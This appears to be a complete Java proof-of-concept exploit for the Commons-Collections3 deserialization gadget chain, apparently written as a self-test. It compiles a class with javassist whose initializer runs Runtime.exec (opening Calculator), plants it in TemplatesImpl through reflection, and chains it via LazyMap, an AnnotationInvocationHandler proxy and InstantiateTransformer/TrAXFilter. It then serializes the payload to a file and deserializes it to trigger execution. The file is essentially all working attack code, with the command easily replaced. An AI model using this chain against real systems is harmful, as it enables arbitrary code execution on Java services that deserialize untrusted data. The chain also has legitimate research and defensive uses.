import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;


public class CommonsCollections3Test {

    private static Object CreateTemplate() throws IllegalAccessException, InstantiationException, NotFoundException, CannotCompileException, IOException, NoSuchFieldException {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass clazz = classPool.makeClass(String.valueOf(System.nanoTime()));
        String string = "java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");";
        clazz.makeClassInitializer().insertAfter(string);
        CtClass superC = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();
        Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bcField.setAccessible(true);
        bcField.set(templates, new byte[][] {classBytes});
        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "aaaa");
        clazz.writeFile();
        return templates;
    }


    private static Object createPayload() throws Exception {
        final Object templates = CreateTemplate();
        final org.apache.commons.collections.Transformer transformerChain = new ChainedTransformer(
                new org.apache.commons.collections.Transformer[]{ new org.apache.commons.collections.functors.ConstantTransformer(1) });

        final org.apache.commons.collections.Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { templates } )};

        final Map innerMap = new HashMap();
        Map lazyMap = org.apache.commons.collections.map.LazyMap.decorate(innerMap, transformerChain);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
        Map map = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(),lazyMap.getClass().getInterfaces(),invocationHandler);
        Object instance = constructor.newInstance(Override.class, map);
        Field field = transformerChain.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(transformerChain,transformers);
        return instance;
    }


    private static void createPayloadFile(Object object, String file)
            throws Exception {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File(file)));
        objectOutputStream.writeObject(object);
        objectOutputStream.flush();
        objectOutputStream.close();
    }

    private static void payloadTest(String file) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(file));
        Object o = objectInputStream.readObject();
        System.out.println(o);
        objectInputStream.close();
    }

    public static void main(String[] args) throws Exception {
        createPayloadFile(createPayload(),"payload");
        payloadTest("payload");
    }
}
